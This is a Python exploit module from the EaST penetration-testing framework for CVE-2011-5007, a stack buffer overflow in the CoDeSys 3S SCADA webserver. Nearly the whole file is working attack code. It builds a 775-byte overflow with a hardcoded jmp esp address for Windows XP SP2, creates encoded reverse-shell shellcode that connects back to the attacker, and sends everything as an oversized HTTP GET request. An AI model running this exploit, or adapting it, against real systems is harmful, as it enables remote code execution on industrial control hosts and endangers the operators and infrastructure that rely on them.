#!/usr/bin/env python
# The exploit is a part pack for EAST- use only under the license agreement
# specified in LICENSE.txt in your Agora distribution
# immunity debugger !mona egg -t EaST

import sys
import re
import os
import socket

sys.path.append("./core")
sys.path.append("./shellcodes")
from Shellcodes import OSShellcodes
from Sploit import Sploit

INFO={}
INFO['NAME']="efs_codesys_webserver_sbo"
INFO['DESCRIPTION']="Codesys 3S webserver stack based buffer overflow"
INFO['VENDOR']="http://codesys.com"
INFO["CVE Name"]="2011-5007"
INFO["NOTES"]="""
    Stack buffer overflow
    Tested on win xp sp2 CoDeSys SCADA 2.3
    """
INFO['CHANGELOG']="28 Sept, 2015. Written by Gleg team."
INFO['PATH'] = "Exploits/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.118"
OPTIONS["PORT"] = "8080"
OPTIONS["SSL"] = False

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.port = OPTIONS["PORT"]
        self.host = OPTIONS["HOST"]
        self.ssl = ssl
        self.url = ""
        self.name = INFO['NAME']
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = self.args.get('SSL', self.ssl)
        if self.ssl:
            self.url = "https://"+self.host+":"+str(self.port)
        else:
            self.url = "http://"+self.host+":"+str(self.port)
        return

    def check(self):
        self.args()
        """
          Quicky banner check
        """
        #self.setInfo( "%s attacking %s:%d - Running" % ( NAME, self.host, self.port ) )
        self.log( "Testing %s:%d" % ( self.host, self.port ) )
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
        except socket.error, msg:
            self.log("Error : %s"%msg)
            return 0
        s.close()
        return 1

    def get_sc(self):
        self.BADCHARS = ["\x00", "\x09", "\x0A", "\x3F", "\x20", "\x23", "\x5E"]
        self.log("shell creating...")
        self.CONNECTBACK_IP = socket.gethostbyname(socket.gethostname())
        if self.args['listener']:
            shellcode_type = 'reverse'
            port = int(self.args['listener']['PORT'])
        else:
            port = 9999
            shellcode_type = 'command'
        self.CONNECTBACK_PORT = port
        os_system = os_target = 'WINDOWS'
        os_arch = '32bit'
        s = OSShellcodes(os_target, os_arch, self.CONNECTBACK_IP, self.CONNECTBACK_PORT, self.BADCHARS)
        shellcode = s.create_shellcode(
            shellcode_type,
            encode=1,
            debug=0
        )
        if shellcode:
            self.shellcode = shellcode
            return shellcode
        else:
            return 0
    def run(self):
        if not self.check():
            self.log( "Testing didn't find vulnerable target" )
            #self.setInfo( "%s attacking %s:%d - (Failed!)" % ( NAME, self.host, self.port ), showlog = 1 )
            self.finish(False)
            return 0
        if not self.get_sc():
            self.log( "Failed when creating shellcode" )
            #self.setInfo( "%s attacking %s:%d - (Failed!)" % ( NAME, self.host, self.port ), showlog = 1 )
            self.finish(False)
            return 0
        BUF = 4000
        buff = "A" * 775
        buff += "\xED\x1E\x94\x7C" # jmp esp ntdll xp sp2
        buff += self.shellcode
        buff += "\x90"*(4-len(self.shellcode)%4)
        buff += "\x90"*(BUF-(len(buff)))
        send = "GET /" + buff + " HTTP/1.0\r\n\r\n\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        s.sendall(send)
        self.log("Send payload now waiting for connection")
        try:
            s.recv(1024)
        except:
            pass
        self.finish(True)
        return 1
if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
